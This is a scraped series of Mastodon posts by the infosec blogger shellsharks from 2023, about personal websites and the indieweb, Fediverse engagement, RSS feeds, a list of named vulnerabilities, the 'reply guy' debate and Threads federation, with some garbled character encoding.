I‚Äôll go dark for 8 months at some point though. üòÖ shellsharks @shellsharks 2023-08-16T04:25:45Z I previously wrote about why you should start a #blog (https://shellsharks. com/you-should-blog). That piece is filled with solid reasons I still stand by today. But since that time, I&#39;ve come to understand a more meaningful reason to have a website and as part of that site, some form of syndicated content (i. e. a blog). For most, &quot;identity&quot; on the web is tied to one, or fractured across a few, social media platform(s). Recent history has revealed the pitfalls of this approach. Enshittification, terrible management, or even platform collapse can result in catastrophic loss of your connections, communities, business income and more. So many refuse to leave Twitter (er. . . &quot;X&quot;) because they&#39;re too invested, to leave would be to sacrifice one or more of these things. Why do we continue to feed these platforms that always fail, that always betray us, that violate our privacy, that never represent who we truly are? Having a website, a place that is yours, that you can design to your specification, share anything you want, how you want and make easily available to all is such an obvious solution and it really isn&#39;t that much harder than creating a (pick your social media platform of choice) account. There are a TON of services these days that make it dead simple to get up and running with a customizable site and start publishing. The beauty of this (blogging), is that you can syndicate however you&#39;d like from there. So go ahead, share on Mastodon, or Threads, or wherever, but remember to link back to the true canonical representation on your site. #indieweb #blogging https://shellsharks. com/notes/2023/08/16/your-website-your-identity shellsharks @shellsharks 2023-08-16T21:56:07Z @ojensen @benmontour Now to wait and see who proudly lists this CVE on their ‚Äúexploit researcher‚Äù resume üòÜ shellsharks @shellsharks 2023-08-17T19:22:06Z What term do you prefer? shellsharks @shellsharks 2023-08-17T21:27:56Z @cR0w Where does it end though?

Follow liberally, the more you follow the more you see and those follows are likely to boost others. Once you‚Äôre established, you can prune follows you really don‚Äôt care for. 2. Find those that boost very generously. The fediverse power-boosters will send lots of great stuff your way. 3. Hashtags. Follow your interests very easily! 4. Local timeline. infosec. exchange has a pretty good local chatter. 5. Some clients (and maybe native Mastodon) has trending hashtags. 6. Time. I love the state of my timeline but it didn‚Äôt form over night. It takes a bit of time but if you put some effort into curating the feed (using points above), you‚Äôll end up with something vibrant, personalized and fantastic. shellsharks @shellsharks 2023-08-18T11:45:51Z Looking for a little troubleshooting guidance. I purchased a refurb 11th gen intel DIY #Framework laptop and put #Fedora 38 on it yesterday. When initially using the live CD, the wireless card (Intel AX210) was detected and worked fine. After installing the OS to disk and booting up, the wireless card was no longer detected. I‚Äôve tried getting the drivers from intels site and moving them into /lib/firmware but this didn‚Äôt work. Any tips on what to do? Thanks! #askfedi @frameworkcomputer shellsharks @shellsharks 2023-08-18T14:53:58Z @adamw @frameworkcomputer I did update. How can I fix if that is the case? Appreciate it! shellsharks @shellsharks 2023-08-18T15:05:29Z @adamw @frameworkcomputer I‚Äôll give that a shot. What‚Äôs strange is booting from the live OS now doesn‚Äôt fix the Wi-Fi issue‚Ä¶ shellsharks @shellsharks 2023-08-19T04:54:30Z @alciregi @adamw @frameworkcomputer Ding ding ding!

Quick little note/write-up with some pics if anyone is interested in checking out the setup. #framework #fedora #linux #diy @frameworkcomputer shellsharks @shellsharks 2023-08-21T19:16:40Z Using #mondayblogs to resurface my catalog of posts throughout the years. Starting with &quot;Getting into Information Security&quot;, from 2019. Back then, so many people were asking me how to get into the field and after typing thoughtful and long responses so many times I finally felt it was worth just writing a blog post and sharing that out instead. And thus began my site! https://shellsharks. com/getting-into-information-security #infosec #cybersecurity #blogging FYI - MondayBlogs is also a cool concept so check this out to learn more - https://badredheadmedia. com/2013/12/31/mondayblogs-participate/. shellsharks @shellsharks 2023-08-22T14:05:53Z @howelloneill Oh man, I too love #RSS. I wrote some stuff about it years ago https://shellsharks. com/an-ode-to-rss but have been meaning to write something new as my appreciation for it has grown even more. shellsharks @shellsharks 2023-08-24T00:13:16Z @Ichinin so many great 3rd-party masto clients these days though‚Ä¶ shellsharks @shellsharks 2023-08-24T16:42:03Z @jfkimmes Here‚Äôs some recommended follows I pulled from my list‚Ä¶ - @graham- @trojanfoxtrot- @crudd- @hawkes- @osxreverser- @Xilokar- @sanjaymenon- @cR0w- @mttaggart- @chompie1337 üòé shellsharks @shellsharks 2023-08-24T17:50:13Z I recently shared a note (https://shellsharks. com/notes/2023/08/16/your-website-your-identity) about why having a domain as your identity is so important these days thanks in large part to the enshittification of the large social platforms. But I extend this warning to those who have placed their trust in *any* platform, even something like Mastodon. See what has happend with outdoors. lgbt (http://outdoors. lgbt) (i. e. catastrophic backup failure), or what is _currently_ happening with fosstodon (https://m6n. io/@fuzzychef/110936040096524936) and you will see that even good intentioned server admins are still prone to failure. These failures can result in total loss of your online identity/account. So put your faith in yourself. Buy a domain, host your stuff there, syndicate it out where you please, *live on*. https://shellsharks. com/notes/2023/08/24/where-we-live-on #indieweb, #rss shellsharks @shellsharks 2023-08-24T17:57:40Z I&#39;ll add to this. Even here @ infosec. exchange this rings true. You can&#39;t ask for a better server admin than @jerry . Even-handed, extremely technically-proficient, community-oriented, you name it. But a day will inevitably come when Jerry has to hang it up one way or another, whether that be to pass admin-ship onto new worthy ownership or w/e. With any luck, that new era of infosec. exchange will inherit the same awesome stability we will have enjoyed up to that point, but if not, better to have your own stable point on the web (i. e. your domain) that you can always fall back and point people to. Happy webbin&#39;! shellsharks @shellsharks 2023-08-27T13:59:13Z @Edent I can‚Äôt say I have any ‚Äúscheduled‚Äù. But I have a ton in draft at all times. shellsharks @shellsharks 2023-08-28T11:53:30Z A thorough list of &quot;named&quot; vulnerabilities https://shellsharks. com/designer-vulnerabilities. #mondayblogs #blogging #infosec #cybersecurity @greynoise featured the repo in a presentation on Mass Exploitation - https://www. slideshare. net/andrewwantsyou/greynoise-mass-exploitation. shellsharks @shellsharks 2023-08-29T23:51:05Z @thefreehunter Where‚Äôs, ‚Äúdepends on the risk‚Äù? It being ‚Äúin the OWASP top 10‚Äù isn‚Äôt enough info. Escalation is a path for more serious bugs. I‚Äôd expect an in-place risk management pipeline to deal with anything else (i. e. document it). Of course as an internal Pentester, there too are valid paths for ‚Äúexploiting‚Äù it and then presenting more compelling results to the technical team. shellsharks @shellsharks 2023-09-06T20:29:28Z @infoseclogger Had kinda maintained this list for a while https://shellsharks. com/mastodon#infosec-instances. shellsharks @shellsharks 2023-09-13T22:09:48Z @tychotithonus Tootfinder (among other things) - https://tootfinder. ch/join. php shellsharks @shellsharks 2023-09-18T14:16:49Z A curated, continuously-updated and (decently) categorized list of online&quot;infosec tools&quot;, many of which I use myself. https://shellsharks. com/infosec-tools. #mondayblogs #blogging #infosec #cybersecurity shellsharks @shellsharks 2023-09-20T20:44:37Z @dismantl if there are any jobs at Salesforce you‚Äôre interested in (https://www. salesforce. com/company/careers/), I‚Äôd be happy to refer you. shellsharks @shellsharks 2023-09-20T21:15:20Z @jerry Easiest way to see engagement here is to engage, I. e. respond to other peoples stuff, rather than post stuff and expect people to respond to it, especially if your follower count is low. I understand why this individual feels this way, but I learned that engagement here just works differently than a place like Reddit. Respond to people to create organic conversation, be genuine, use hashtags, put effort in for a few months not days or weeks, creating a network here requires some investment but pays off imo. Some people want more native functionality to boost engagement in their social platform and as it stands now, Mastodon doesn‚Äôt provide this, so getting started requires a bit of effort to get momentum. It‚Äôs not for everyone. I‚Äôve posted (what I felt to be) really interesting things or questions to no response. Other times, I get lots of feedback. Sometimes just random based on the day. Hopefully more people come to appreciate this and give Mastodon more time to grow on them moving forward. shellsharks @shellsharks 2023-09-20T21:33:43Z @pixelpusher220 @jerry Yep exactly. On Reddit, it is common practice to literally create a &quot;throw away&quot; account, post a random question and then get like 500 responses. On Mastodon, it&#39;s pretty impossible to have a 0-follower, brand new account get any engagement, and thus little engagement on posts with small follower counts. This is because on Reddit, it is all about the community (the topic) and the threads within, and not so much about the individuals. I was fairly active in infosec subs on Reddit and have ~8k Karma over a 10+ year span, but only 76 Reddit followers. I&#39;ve been active here for like a year and have over 1k. Here it&#39;s about relationships, and relationships take time to build. Also, Reddit is not really a great comparison with Mastodon. Lemmy/Kbin are better 1-1 offerings and you actually CAN get engagement on just about anything you post over there that isn&#39;t complete garbage. shellsharks @shellsharks 2023-09-20T22:00:00Z @dismantl send me the link and I‚Äôll refer you.

Doesn‚Äôt necessarily need a CVE, fancy artwork, dedicated webpage, etc. . . If you come across one I don&#39;t have I&#39;d love to have you send it to me so I can add it!! shellsharks @shellsharks 2023-10-10T00:31:54Z @aimaz &quot;DynoRoot&quot; might be my fav thanks to the ridiculous song that accompanied its publishing. shellsharks @shellsharks 2023-10-10T00:34:11Z @H3liumb0y @simontsui @r1cksec @Xavier Almost no way this is legitimate (non-commercial) notification. If they had a security issue to report, and they are a security company, there are formal means (in most cases) to report these to company IR teams. I would redirect them to security@yourcompanyname. com (or w/e the distro is for incident reporting =P) shellsharks @shellsharks 2023-10-10T15:55:14Z @simontsui Thanks!! Got this one üòÅ shellsharks @shellsharks 2023-10-11T02:19:38Z @a172 @campuscodi The whole idea of naming vulns is pretty silly in general when you think about it.

Plenty of vulns on here people have never heard of and are not high severity. Even better when they have art, custom domain and more. shellsharks @shellsharks 2023-10-11T03:12:51Z @tecnobabble Likewise Seth! Good to hear from ya. Will keep you in mind next time I have some Tenable stuff on my plate. =) shellsharks @shellsharks 2023-10-11T11:57:23Z @a172 @campuscodi I thought about this last night and I think I agree I with you. Let&#39;s be serious about the unseriousness =). I&#39;ve removed that vulnerability from the official list and made mention of it at the bottom. I appreciate the feedback! I do think it&#39;s a higher quality list now. shellsharks @shellsharks 2023-10-13T01:04:01Z I recently went through all of my follows (mostly infosec folks) to find their blogs/sites so I could add them to this list ( https://shellsharks. com/infosec-blogs ) I maintain as well as subscribe to their respective RSS feeds.

Since then they‚Äôve shoved more behind a paid tier and introduced a bunch of quirky features that I personally don‚Äôt really need.

It&#39;s like, can I see myself doing grunt engineering at 50? Not really. Do I have interest in management and would be doing that by then? Maybe, though I&#39;d still like to remain pretty technical for the foreseeable future. I don&#39;t see myself fully retiring by 50, even if I had the money to do so. Instead, I&#39;d probably set out to do independent research, choice consulting, or try some other sort of boutique tech/infosec startup.

I did want to comment though that I think iPads are really much more powerful than a lot of people give them credit for. I‚Äôve posted recently about how good they are with stage manager and external monitor support in replicating a ‚Äúreal computer‚Äù with respect to multi-tasking and windowed apps (given you have an M1-enabled iPad Pro). Though not EVERY workload is natively accessible on modern iPad hardware, most things are. There are IDE‚Äôs, photo/video editing software, Remote Desktop, tools for Git, Interpreters (e. g. JS, Python, etc‚Ä¶), Swift playgrounds, and more! If you really really need more than that you could even just get yourself an AWS account and SSH into a traditional OS and play around with it directly from the iPad. You get all this in a package that has great battery life, never has a loud fan, can sport a cellular connection, has all the power of the vast library of iOS/iPad apps, and is extremely portable. All this said, what are you envisioning for your kids in terms of what they could learn on a ‚Äúfull machine‚Äù? Powershell/Bash? Compiled languages? Virtualizing Linux and doin‚Äô stuff? I keep some ‚Äúreal computers‚Äù around for various things I do in the infosec space but have started to move 99% of my daily compute to an iPad for all the reasons I mentioned. Cheers! shellsharks @shellsharks 2023-10-28T00:42:28Z @paulsanders FWIW, you can connect a mouse and a keyboard to an iPad, it has both Apple and Microsoft Office suites and sports some interpreters for doing like Python programming etc‚Ä¶ This said, I have a hard time believing in 10/15/20 years there will be companies/offices issuing iPads-only to their employees. So having skills with a ‚Äútraditional‚Äù laptop may still have that value. But ya never know! shellsharks @shellsharks 2023-10-28T01:09:56Z Here‚Äôs a random idea‚Ä¶ there‚Äôs a contingent of folks on Mastodon (and on other social platforms) that will *pretty much* auto-follow-back anyone who follows them. Not sure how large this group is but they exist. Now consider the relative difficulty of a new, or low-follower account reaching a large audience or even being seen at all in the Fediverse. Without an algorithm, posts are easily lost in the local timeline deluge, never to be seen or engaged with. What if, for those who want to amass followers (for whatever reason) and would in turn follow anyone who followed them, put a keyword, something like ‚Äú#autofollow‚Äù or something in their profile which could be crawled and then the entire network of people with this tag could instantly* follow all those accounts and be followed by all those accounts. Now they have some level of reach, as their posts would hit home timelines instead of local timelines and they have some level of discoverability as active posters and boosters are now populating their own home timeline. At any point, once you felt you had a decent footing you could remove the tag from the profile and thus exit said ‚Äúnetwork‚Äù. From there, you could prune your follows as you saw fit. This idea isn‚Äôt fully fleshed out and I‚Äôm sure there are plenty of abuse vectors, and no tooling for automating the ‚Äúnetwork‚Äù, but I think there would be a fair amount of people who would benefit from bootstrapping a follow/follower footprint on Mastodon since feed curation and gaining followers can be time consuming. #random #follow #mastodon #fediverse shellsharks @shellsharks 2023-10-28T01:26:34Z @Sibilant@kind. social lmao üòà.

There‚Äôs actually a lot of (extra) information/metadata I‚Äôd like to add to each of those records. In its current simple list-based form it would just be too cluttered to add most of it. I‚Äôve had an idea for a while to grab a domain and set up a dedicated site with a database to house everything - name, cve, date published, logo, researcher who found it, CVSS score and could add more like what you suggested. Perhaps I‚Äôll try to do something like that in the Dec-Feb ‚Äò24 timeframe and could reach out then and see if you wanted to help out. shellsharks @shellsharks 2023-11-06T11:58:58Z @Tain05 I made this ‚Äústarter pack‚Äù if you‚Äôre interested in reading. https://shellsharks. com/notes/2023/10/20/infosec-mastodon-starter-pack Most importantly, just be you and engage (respond, boost, star) frequently! shellsharks @shellsharks 2023-11-06T14:10:31Z For #infosec folks out there, what‚Äôs your routine/strategy for ‚Äústaying current‚Äù in the field? I‚Äôve written about my daily reading routine here for anyone interested. https://shellsharks. com/notes/2023/11/06/keeping-current-in-infosec #cybersecurity #nablopomo #mondayblogs shellsharks @shellsharks 2023-11-06T14:34:54Z @mttaggart I love what you‚Äôve done with it. Even considered trying to do something similar since I‚Äôve put so much effort in over the years compiling this list - https://shellsharks. com/infosec-blogs. Would definitely recommend this to others looking to pump up their regular infosec news-intake routine though. shellsharks @shellsharks 2023-11-06T16:11:28Z @holsta@helvede. net Those of us who deal with Third-Party security are often uniquely focused on just that, what everyone else is doing and what is happening to them =). That said, I‚Äôd say my penchant for reading about across-the-industry stuff comes more from a personally-focused (albeit career-related) interest in all things infosec. Your advice isn‚Äôt bad though, especially for those who read infosec news mostly for work and have a narrower scope. Cheers! shellsharks @shellsharks 2023-11-06T16:48:37Z @pswapneel Awesome! RSS is definitely my go-to as well. Social media needs more folks sharing . opml files if you ask me üòÅ. shellsharks @shellsharks 2023-11-07T00:58:41Z @simontsui @campuscodi This has been added! shellsharks @shellsharks 2023-11-07T00:59:40Z @bcshort Yes, my plan is to get the podcast started up soon so stay tuned! shellsharks @shellsharks 2023-11-07T12:30:49Z Taking another break from tech/infosec to write about some places I‚Äôve traveled.

When you say ‚Äúdead sites‚Äù, do you mean those that are inactive in terms of having new posts published? Or those that are completely inaccessible? Feedly has dead / inactive URL telemetry so I can probably do some cleaning up of the . opml from that. TBH it‚Äôs been a while since I‚Äôve done that and updated what I‚Äôve made available from the site. shellsharks @shellsharks 2023-11-07T21:15:34Z @eloquence @bcshort I‚Äôm always adding to that list too üòú! shellsharks @shellsharks 2023-11-07T21:16:00Z @bcshort I‚Äôll add it to my to-do list =) shellsharks @shellsharks 2023-11-08T13:46:37Z @bcshort I‚Äôve removed some of the completely dead feeds according to Feedly and updated the . opml. It had been quite a while since I had done so. Let me know what you think of the new upload. If you‚Äôre still seeing a large amount of dead links let me know. Thanks! shellsharks @shellsharks 2023-11-09T13:13:57Z @bcshort Traditionally, I haven‚Äôt cared to prune inactive feeds. A. Maybe they‚Äôre just _very_ infrequent versus completely stagnant. As a blogger who‚Äôs gone through dry spells I understand why someone might not post something for 6 months+. I wouldn‚Äôt want to prune a feed if someone was going to add to it after a while. B. Even with Feedly I have a very high limit of feeds I can add. Until I reach the threshold I‚Äôm not too worried about pruning things as they don‚Äôt affect the fidelity of the feed. As for feeds with only one or two articles‚Ä¶ 1. Are those feeds 1-2 articles because the blog is new or‚Ä¶ 2. Someone stood up a blog, added a few articles and then abandoned the project all together (I‚Äôve been here in the past so understand this is very possible). Since the last time I uploaded the . opml file, I did go in and delete ALL medium-based sites because I found a lot of them met the #2 criteria above, also pay wall and other annoying things Medium does made me just eliminate it. Thanks! shellsharks @shellsharks 2023-11-09T13:25:58Z Some strategies I employ for making more time in the day.

All my posts have publish dates and last updated dates. Because I‚Äôm a good person. shellsharks @shellsharks 2023-11-14T16:05:11Z @chileannick OK, I feel like I have to comment on our friend Elyssa‚Äôs post‚Ä¶ 1. People absolutely do share ‚Äúold‚Äù content. Also, I have a lot of ‚Äúold‚Äù posts that I keep very much up-to-date, hence a the need for a last-updated date. 2. ‚ÄúThe URL is too hard to remember. ‚Äù What?? Who is out there remembering a bunch of full URLs like a crazy person? 3. I‚Äôll concede a bit on the third point. I don‚Äôt much like the date-in-the-url either, preferring just a good name-only scheme instead (most of the time). But this doesn‚Äôt mean not to have dates somewhere in the post itself! (Which to be fair is not what she‚Äôs advocating against) Also, SEO is wack. I have a few posts that are ranked pretty high SEO-wise that are ‚Äúold‚Äù so I wonder how much age does to nerf page rank‚Ä¶ shellsharks @shellsharks 2023-11-14T17:01:25Z @chileannick Y‚Äôknow for some types of blogs, like a recipe website or something, sure - don‚Äôt have dates on your posts. But for *most* things I feel like it‚Äôs super valuable piece of metadata to include. Do people just think they are so timeless? Also what‚Äôs up with white papers / research papers never having publish dates?

Thankssssss! shellsharks @shellsharks 2023-11-17T13:09:43Z @Lemniscate Great thread! I bookmarked it last night and just had time to read through it. With so many folks out there trying to get into the field (as you mentioned), these types of genuine advice threads are very valuable imo. I don‚Äôt know if you have a blog or not, but you should consider making one, even if just to host this thread haha! My getting into infosec post was actually the whole reason I created my blog in the beginning https://shellsharks. com/getting-into-information-security. One other thing, and I hope it doesn‚Äôt come off too preachy but infosec. exchange offers 11k characters in a single post so you *could* put long threads in a single post in theory. The other option would be to make the initial 1/X post public and set all sub-posts in the thread to Unlisted to the timeline doesn‚Äôt get wrecked. Anyways, thanks again for taking the time to share out your tips!! shellsharks @shellsharks 2023-11-17T14:32:28Z My observations / ‚Äúanalysis‚Äù on the *substance* of the content I see on Mastodon vs Threads.

The note below explains why that doesn‚Äôt make sense and further, why Mastodon will never die! https://shellsharks. com/notes/2023/11/18/mastodon-will-never-die #nablopomo shellsharks @shellsharks 2023-11-18T12:16:38Z @davidpierce Sorry had to do it!

Is that the future for you do you think (in terms of primary place where you post)? Seems Mastodon is positioned as a more permanent spot for infosec community but Threads is the big guy‚Ä¶ I‚Äôd be kinda worried about their eventual moderation policies for exploit/intel sharing.

Basically it‚Äôs GitHub Pages + Jekyll. The tools I use around that vary whether I‚Äôm on desktop or iPad/mobile. Would I pick it again? Maybe. It has been really easy to use but now that I know more about IndieWeb I‚Äôd probably choose something a little more IndieWeb friendly and/or that has ActivityPub support. Not much technical expertise required imo. It is really simple to stand up. If you want to customize the look and feel you‚Äôre going to have to learn a bit about Liquid syntax, html, JS, CSS, etc‚Ä¶ I don‚Äôt ‚Äúhave‚Äù to do a lot of maintenance. But I add a lot of stuff to the site including experimental features so a lot of care and feeding go into making sure things are running correctly. I‚Äôll add that I‚Äôm no web dev/design expert so this adds to the amount of maintenance overhead I have. shellsharks @shellsharks 2023-11-22T13:36:16Z Two things you need to know about YAML. 1.

Thanks for the feedback! shellsharks @shellsharks 2023-11-28T17:28:14Z @zens Ah yes, the classic issue of people failing to actually read. This is *rampant* in workplace email culture haha. Good one. shellsharks @shellsharks 2023-11-28T17:36:42Z @annthurium This phenomenon of an individual chronically responding to everything (or nearly everything) someone else posts with little unhelpful/unrelated replies is interesting, and by the sound of it, *very* annoying. For you, would you consider someone a ‚Äúreply guy‚Äù if they are a one-off or very infrequent offender? Versus an individual who is a serial commenter (bordering on harassment). shellsharks @shellsharks 2023-11-28T17:38:13Z @KydiaMusic @moira Yeesh, I (unfortunately) learned a new word today, ‚Äúsea lioning‚Äù. Sorry you‚Äôve had to deal with that =/. Thanks for your response! shellsharks @shellsharks 2023-11-28T17:50:51Z @fishidwardrobe I‚Äôm still developing my own understanding but I think what you‚Äôre saying is kinda spot on. Clearly, what makes someone a ‚Äúreply guy‚Äù to any one person varies. A very simplistic decomposition of the term seems to demonize men (‚Äúguys‚Äù) who ‚Äúreply‚Äù in one (or more) of a variety of ways - ranging from just being annoying to being overtly suggestive, malicious and/or hostile. This seems to overwhelmingly affect women but is not necessarily isolated to that. I don‚Äôt deny there is an issue, and that issue is wide spread, but I do think the term is unfortunate and I see it increasingly becoming a way that very mild offenders, maybe a guy who responds in a slightly off-putting way to someone is inevitably lumped in with the individuals who are much more malicious in nature. Can‚Äôt say I‚Äôm a fan of generalizing a spectrum of bad actors then coupling that with the virality of name-calling as it seems like it will ultimately lead to unnecessary escalation with those who may have said/done the wrong thing but could have otherwise been educated. Mastodon adding some pre-reply/post modals may be able to do some good for the less malicious offenders‚Ä¶ Hopefully what we as a community take away from this (i. e. the ‚Äúreply guy‚Äù phase of social media and the various immune responses) is an education on how to think before we speak (i. e. post, reply, etc‚Ä¶), how to consider our audience and FFS, how to be kind to each other. *More to come on this from me as I digest some of the responses and the poll results themself. shellsharks @shellsharks 2023-11-28T17:52:27Z @opendna Ah interesting take. I like this definition as it is more true to the name itself. ‚ÄúReply guy‚Äù in this sense wouldn‚Äôt imply maliciousness, rather it calls out the fact that an individual is particularly serial in how they respond to a specific person or maybe a number of people. Thanks! shellsharks @shellsharks 2023-11-28T17:56:34Z @emmy This is my fear right now. The community seems to be taking meaningful action against the bedeviled ‚Äúreply guy‚Äù, a variety of articles are being written about what it means to be one but a product of this discourse seems to be people becoming too worried to engage with others outside of their circle out of fear of being bad-labeled. With whatever ounce of influence I might have (which is admittedly nil), I‚Äôd like to encourage people to continue to engage with others outside their circles, even when that engagement is to disagree. Now of course you should be considerate and understand who you are engaging with before you do, but you shouldn‚Äôt have to fear that you will be ‚Äúcanceled‚Äù (hate to use that term) as a bad actor/‚Äúreply guy‚Äù just because you replied to someone in a way that was somewhat adverse. shellsharks @shellsharks 2023-11-28T17:58:06Z @Sylkeweb Understood. Yes unfortunately too many people don‚Äôt want to ‚Äúengage‚Äù, i. e. open a two-way dialogue. Rather they want to one-way their perspective/opinion/perceived reality without ever trying to understand yours. Ugh. shellsharks @shellsharks 2023-11-28T18:03:37Z @Ichinin This seems to be the tricky gray area. Too often tone is lost in text-based communications (like social media). A perfectly benign reply could be perceived as ‚Äòsplainy, condescending, rude, etc‚Ä¶ when in reality that was not the intention. A angered response to that reply can elicit an equal-and-opposite response from the reply-er so now you have an escalation thanks to what amounts to a miscommunication. It‚Äôs hard to blame people for not taking replies in good faith when it seems too often the replies are in fact not genuinely curious or otherwise non-malicious. shellsharks @shellsharks 2023-11-28T18:07:10Z @anjune@linuxrocks. online From what I‚Äôve seen in the responses, the men who appear to the worst offenders in this ‚Äúreply guy‚Äù plague would take any opportunity to attempt to dunk on you because you are a woman who had something to say they didn‚Äôt agree with, regardless of looks. But as you mentioned, you are likely taking borderline ‚Äúreply guy‚Äù replies in stride (i. e. not attributing malice) which I think is the healthy reaction. It‚Äôs important for us to keep open minds when someone chooses to engage with us on social media. It may become clear later in the discourse that the person has no good-intentions but I would caution any jumping to conclusions. Thanks for the response! shellsharks @shellsharks 2023-11-28T18:08:23Z @patamystic üòÜ. The poll was set to allow multi-selection but an ‚Äúall of the above‚Äù would definitely have made it easier for someone to quickly just say so haha. I did notice fwiw that a lot of third-party mastodon clients did not actually allow multi-select polling to work. Ugh! shellsharks @shellsharks 2023-11-28T18:11:27Z @CassandraVert I‚Äôm wrong all the time, just ask my wife! =P. I like to think I‚Äôm evolved enough though to be educated and if I were to respond to someone in a way that was factually incorrect I would want to be corrected so I could learn from that conversation! This is however a skill most people don‚Äôt seem to possess as everyone on the internet is a know it all haha. I would hate to be labeled a ‚Äúreply guy‚Äù for merely being wrong about something though, without first being able to learn from that discussion if it applies, admit that I was wrong or that I learned. What do you think? shellsharks @shellsharks 2023-11-28T20:24:35Z @CassandraVert Exactly! People are too scared to be wrong on the Internet or in life. Having the social IQ to preface your reply with your own background and limitations could go a long way. Thanks!üôè shellsharks @shellsharks 2023-11-28T21:45:28Z @matthew_d_green On Mastodon, engagement is often a function of how many followers you have, discovery however is a function of who you follow and how many people you follow. My advice, follow more people ‚Äî&gt; discover more stuff! You can always prune folks later if you decide you don‚Äôt like what they post. Don‚Äôt overthink who you follow for now, just try to populate your timeline and let the boosts rain new and interesting accounts upon you. I‚Äôd be interested to hear how any of the other current social networks are meeting your discovery needs better than Mastodon could. Threads has a decent algo but it‚Äôs touchy and very brand/influencer heavy until you use for a few weeks. X seems to be just alt-right rage bait stuff and bluesky at least for me is a dead zone. Also, you have 15k+ followers here, you can definitely ask the fediverse who you should be following and you‚Äôll get tons of answers. üòù Hope you decide to keep spending your time here!! shellsharks @shellsharks 2023-11-29T12:55:32Z How was this vulnerability not named ‚ÄúownedCloud‚Äù or ‚ÄúpwnCloud‚Äú by now? https://www. bleepingcomputer. com/news/security/hackers-start-exploiting-critical-owncloud-flaw-patch-now/ shellsharks @shellsharks 2023-11-29T14:15:45Z @kpwn Hahahaaa!

This is somewhat mitigated by the fact that the non-infosec components of IT, operations teams and the SRE discipline all are concerned with A as well. This allows infosec folks to put it third on the list a lot of the time. Also sometimes comes down to risk model of the business in scope. Some modicum of downtime is often preferable to data breach, especially when regulations punish confidentiality compromise and not availability issues. shellsharks @shellsharks 2023-12-08T15:22:28Z @nf3xn I like to think about it this way. When you sign up for let‚Äôs say AWS. AWS markets their ‚ÄúA‚Äù at whatever, some amount of 9‚Äôs. They‚Äôre telling you that their Availability is good, but you should *expect* downtime at some infrequent interval. They would never market hey, you should expect a breach (or C/I compromise) at some point. That said, when you look at the modern threat landscape, often the biggest threats to an org are not C/I-related issues. It is instead ransomware! Which first and foremost effects A. Only more recently have ransomware actors started also exfil-ing data thus compromising C as well and using that for blackmail. So back to your original point, infosec folks *still* discount A despite it being what is largely targeted these days and with the greatest consequences! Good stuff. shellsharks @shellsharks 2023-12-08T15:35:31Z @jos1264 No vuln name?

This isn‚Äôt mean to demean Holiday Hack. It‚Äôs an awesome CTF with cool gameplay, music and more. I highly recommend anyone in infosec (or outside of infosec) play if they can.

But using the blueprint, or individual curriculum, of a cert as you have suggested is a great idea and something I have also advised in the past (https://shellsharks. com/training-retrospective#thoughts-on-sans-training-and-giac-certification-exams). With certs, it‚Äôs about the journey, not the destination. Having letters is great, but learning the course material is where you (literally) make the money. shellsharks @shellsharks 2023-12-11T15:35:01Z I‚Äôve really loved writing for and building my blog over the years, making it uniquely mine.

Also, just call it a ‚Äúresume‚Äù - not a ‚ÄúCV‚Äù (https://en. wikipedia. org/wiki/Curriculum_vitae) ‚ÄîLikes‚Äî- I like the /todo page with aspirational projects (bonus points for having a ‚Äúroadmap‚Äù list)- Dark theme is nice- Haven‚Äôt done the flag hunt yet but I love that idea. Have been considering it for a while myself. I have a ‚ÄúCTF‚Äù of sorts built into my site main logo. - +10 for having an RSS feed- I too want to build a Blogroll. Nice!- Random post feature is fun- Snow on the home page is whimsical.

I was rewarded in very short order! - My feed has seemed a little less ‚Äúfull‚Äù of late. Maybe I‚Äôm missing some folks who defederated or left? - I‚Äôve been obsessively online so I‚Äôm cruising through my timeline faster and more often. The local timeline is a great place to find gem accounts with less reach that are probably relevant to your interests given they are on the same instance. Give it a try! shellsharks @shellsharks 2023-12-15T12:22:29Z @sumikko when u first create your account here, the local feed is where you gotta be for sure. Welcome! shellsharks @shellsharks 2023-12-15T19:27:14Z For #followfriday, I want to share a few #infosec -related accounts I‚Äôve discovered recently that are great! @h4sh@scalefree @still @rcvalle @jbn @cxiao @segiddins @bouncyhat @Jrod @dale_nunns shellsharks @shellsharks 2023-12-16T12:43:15Z @cxiao @jerry #3 for me. I‚Äôd love to see the #infosec community that has found shelter here, STAY here. For holdouts on X, I hope they decide to *eventually* come here when that service inevitably dies rather than go to the next behemoth centralized platform. I realize many will be drawn to the audience that comes with being on Threads but given the Mastodon ‚ÜîÔ∏è Threads interoperability, maybe they will consider the idea of growing their following on Mastodon instead. For some communities, Threads may just be better, but for infosec, especially when it comes to certain things (i. e. sharing security intel, exploit code, etc‚Ä¶) I think we‚Äôre better off on Mastodon and would not be subject to Meta moderation that might neutralize these things. shellsharks @shellsharks 2023-12-16T13:38:59Z @jerry @cxiao I haven‚Äôt found them üòï. Maybe it‚Äôs just threads algo not surfacing them. I guess I can interact with them there from here which will be nice. shellsharks @shellsharks 2023-12-16T17:06:20Z @jerry @catbuttes @cxiao So if someone on future federated threads found my account and wanted to reply to a post of mine, would I see the reply if I don‚Äôt follow them? Will they be able to follow me? Will I see stuff from Threads boosted by a follow of mine?Still not clear to me after reading the doc. https://docs. joinmastodon. org/admin/moderation/#limit-user shellsharks @shellsharks 2023-12-16T17:23:31Z @jerry @catbuttes @cxiao Ah interesting. I understand this was likely a compromise and I don‚Äôt wanna pester you with more threads-related drama (especially given you‚Äôre heading to the beach) but I personally would be interested in having the relationship between our instance and threads to be normal federation rather than limited. I feel limited won‚Äôt satisfy the anti-threads‚Äôers and handicaps those of us who don‚Äôt mind / want to interact with people there, and have them be able to engage with us. A decision for another day! Threads isn‚Äôt exactly rolling out full federation soon anyways. Have a good trip! shellsharks @shellsharks 2023-12-17T15:13:56Z @jerry Sounds reasonable to me! Hopefully you don‚Äôt feel squeezed by any request or discussion of mine. Honestly I‚Äôm happy to continue just interacting with folks here on traditional fediverse though I wouldn‚Äôt mind having the threads-verse to interact with as well. I plan to be here no matter who we have in the end, even if it‚Äôs just me and you chatting =P.

